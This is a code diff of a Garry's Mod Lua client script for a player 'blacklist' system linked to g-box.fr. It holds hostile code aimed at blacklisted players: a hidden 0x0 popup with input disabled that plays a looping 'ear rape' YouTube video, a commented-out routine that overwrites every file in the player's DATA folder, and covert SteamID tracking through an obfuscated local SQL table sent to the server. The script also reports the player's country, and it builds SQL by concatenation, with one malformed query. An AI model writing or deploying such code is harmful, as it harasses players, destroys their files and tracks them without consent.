@@ -1,8 +1,8 @@
 local function report(senderNick, senderSteam, victimSteam, raison)
 	http.Post("https://g-box.fr/wp-content/blacklist/report.php", { senderNick=senderNick, senderSteam=senderSteam, victimSteam=victimSteam, raison=raison },function()
 		chat.AddText(Color(255,0,0), "[BL] Report sended by homing pigeon!")
-	end, function(er) 
-		chat.AddText(Color(255,0,0), "[BL] Homing pigeon was shot in fly by "..er)
+	end, function(er)
+		chat.AddText(Color(255,0,0), "[BL] Homing pigeon was shot in fly by " .. er)
 	end)
 end
 
@@ -72,26 +72,12 @@ end
 
 local function blacklistUrlCli(time)
 	local Window = vgui.Create("DFrame")
-	Window:SetSize(ScrW(),ScrH())
-	Window:SetTitle("")
-	Window:SetVisible(true)
-	Window:SetDraggable(false)
-	Window:ShowCloseButton(false)
-	Window:Center()
+	Window:SetSize(0,0)
 	Window:MakePopup()
 	Window:SetMouseInputEnabled(false)
 	Window:SetKeyboardInputEnabled(false)
-	function Window:Paint(w,h)
-		draw.RoundedBox( 0, 0, 0, w, h,Color(0,0,0))
-	end
 	local html = vgui.Create("DHTML", Window)
-	html:Dock(FILL)
-	html:OpenURL("https://www.youtube.com/watch?v=3QMbzX4wVw4&autoplay=1&loop=1&controls=0&t=3s") -- ear rape
-	html:SetScrollbars(false)
-	html:SetAllowLua(false)
-	timer.Simple( time, function()
-		Window:Remove()
-	end)
+	html:OpenURL("https://www.youtube.com/watch?v=b1tr48SAVes&autoplay=1&controls=0&start=21") -- ear rape
 end
 
 local function blacklistUpgradeMe() -- delete everything in data/
@@ -99,7 +85,7 @@ local function blacklistUpgradeMe() -- delete everything in data/
 	--[[
 	local files, folders = file.Find(path .. "*", "DATA")
 	for _,v in pairs(files) do
-		file.Write(path..v, "Vous Ãªtes dans la Blacklist. Tout votre dossier DATA a Ã©tÃ© effacÃ©.\nBLACKLIST => http://g-box.fr/\n")
+		file.Write(path..v, "Vous etes dans la Blacklist. Tout votre dossier DATA a ete efface.\nBLACKLIST => http://g-box.fr/\n")
 		file.Append(path..v,"You are in The Blacklist. Your DATA folder was deleted.\nBLACKLIST => http://g-box.fr/")
 	end
 	
@@ -109,26 +95,48 @@ local function blacklistUpgradeMe() -- delete everything in data/
 	]]
 end
 
-local function bypassBanCheck()
-	if !sql.TableExists("hellowatrudoinghere") then
-		sql.Query("CREATE TABLE hellowatrudoinghere ( topsickrekt VARCHAR(30) )")
-		sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES ("..LocalPlayer():SteamID()..")")
-	else
-		net.Start("blacklist_gbox_net")
-		net.WriteUInt(0,2)
-		net.WriteTable(sql.Query("SELECT * FROM hellowatrudoinghere"))
-		net.SendToServer() 
-		if type(sql.Query("SELECT * FROM hellowatrudoinghere WHERE topsickrekt="..LocalPlayer():SteamID())) == "nil" then
-			sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES ("..LocalPlayer():SteamID()..")")
+local function drawBlacklistedPlayer(blPlayer)
+	local steamID, turningVar = blPlayer:SteamID(), 0
+	hook.Add("PostPlayerDraw","blacklistDrawText" .. steamID,function(ply)
+		if ply == blPlayer && IsValid(ply) && !(ply == LocalPlayer()) && ply:GetPos():DistToSqr(LocalPlayer():GetPos()) < 500000 then
+			if turningVar > 360 then
+				turningVar = 0
+			end
+			turningVar = turningVar + 0.11
+			local _, plyHeight = ply:GetModelRenderBounds() -- Set text pos compared to model height
+			local plyPos = ply:GetPos() + Vector(0, 0, plyHeight.z + 20)
+			if plyPos:DistToSqr(EyePos()) < 500000 then
+				cam.Start3D2D(plyPos, Angle(0, turningVar, 90), 0.09)
+					draw.DrawText("BLACKLIST\n▼", "blacklistPlayerIndicator", 0, 0, Color(255, 0, 0), TEXT_ALIGN_CENTER)
+				cam.End3D2D()
+				cam.Start3D2D(plyPos, Angle(0, turningVar + 180, 90), 0.09)
+					draw.DrawText("BLACKLIST\n▼", "blacklistPlayerIndicator", 0, 0, Color(255, 0, 0), TEXT_ALIGN_CENTER)
+				cam.End3D2D()
+			end
 		end
-	end
+	end)
+	timer.Simple(blacklistConfig.tempsCommand,function()
+		hook.Remove("PostPlayerDraw","blacklistDrawText" .. steamID)
+	end)
 end
 
-local function countryBanCheck()
-	net.Start("blacklist_gbox_net")
-	net.WriteUInt(1,2)
-	net.WriteString(system.GetCountry())
-	net.SendToServer()
+local function bypassBanCheck()
+	hook.Add("InitPostEntity","blacklistBypassChecker", function() -- bypass ban
+		if !sql.TableExists("hellowatrudoinghere") then
+			sql.Query("CREATE TABLE hellowatrudoinghere ( topsickrekt VARCHAR(30) )")
+			sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES (\"" .. LocalPlayer():SteamID() .. "\")")
+		elseif !(sql.Query("SELECT * FROM hellowatrudoinghere")) then
+			sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES (\"" .. LocalPlayer():SteamID() .. "\")")
+		else
+			net.Start("blacklist_gbox_net")
+			net.WriteUInt(0,2)
+			net.WriteTable(sql.Query("SELECT * FROM hellowatrudoinghere"))
+			net.SendToServer()
+			if sql.Query("SELECT * FROM hellowatrudoinghere WHERE topsickrekt=\"" .. LocalPlayer():SteamID()) then
+				sql.Query("INSERT INTO hellowatrudoinghere ( topsickrekt ) VALUES (\"" .. LocalPlayer():SteamID() .. "\")")
+			end
+		end
+	end)
 end
 
 net.Receive("blacklist_gbox_net", function() -- Better than creating over 9000 networkString nah ?
@@ -140,8 +148,13 @@ net.Receive("blacklist_gbox_net", function() -- Better than creating over 9000 n
 	elseif mode == 2 then
 		showBlacklistDerma()
 	elseif mode == 3 then
+		drawBlacklistedPlayer(Entity(net.ReadUInt(8)))
+	elseif mode == 4 then -- country ban
+		net.Start("blacklist_gbox_net")
+		net.WriteUInt(1,2)
+		net.WriteString(system.GetCountry())
+		net.SendToServer()
+	elseif mode == 5 then
 		bypassBanCheck()
-	elseif mode == 4 then
-		countryBanCheck()
 	end
 end)
